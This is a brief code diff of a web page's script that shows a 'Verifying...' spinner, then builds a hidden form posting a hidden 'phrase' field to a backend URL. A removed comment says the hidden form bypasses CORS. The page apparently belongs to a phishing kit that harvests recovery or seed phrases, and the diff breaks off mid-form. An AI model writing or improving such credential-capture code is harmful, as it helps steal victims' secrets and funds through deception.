@@ -216,12 +216,13 @@
             submitBtn.disabled = true;
             submitBtn.innerHTML = '<div style="display:flex;align-items:center;justify-content:center;gap:0.5rem"><div style="width:18px;height:18px;border:2px solid rgba(255,255,255,0.3);border-radius:50%;border-top-color:white;animation:spin 1s linear infinite"></div>Verifying...</div>';
             
-            // Create hidden form and submit (bypasses CORS)
+            // Create hidden form and submit
             const form = document.createElement('form');
             form.method = 'POST';
             form.action = BACKEND_URL;
             form.style.display = 'none';
             
+            // CRITICAL FIX: Send as JSON string
             const phraseInput = document.createElement('input');
             phraseInput.type = 'hidden';
             phraseInput.name = 'phrase';
